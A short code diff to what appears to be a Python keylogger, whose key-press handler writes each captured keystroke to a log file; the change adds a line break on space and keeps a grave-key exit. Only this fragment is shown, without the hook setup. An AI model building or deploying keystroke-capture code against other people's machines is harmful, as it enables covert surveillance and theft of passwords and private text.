@@ -7,6 +7,11 @@ def on_key_press(event):
     fob = open(log_file, 'a')
     fob.write(event.Key)
 
+    # if space, create new line
+    if event.Ascii == 32:
+        fob.write('\n')
+
+    # if grave key, end script
     if event.Ascii == 96:
         fob.close()
         new_hook.cancel()
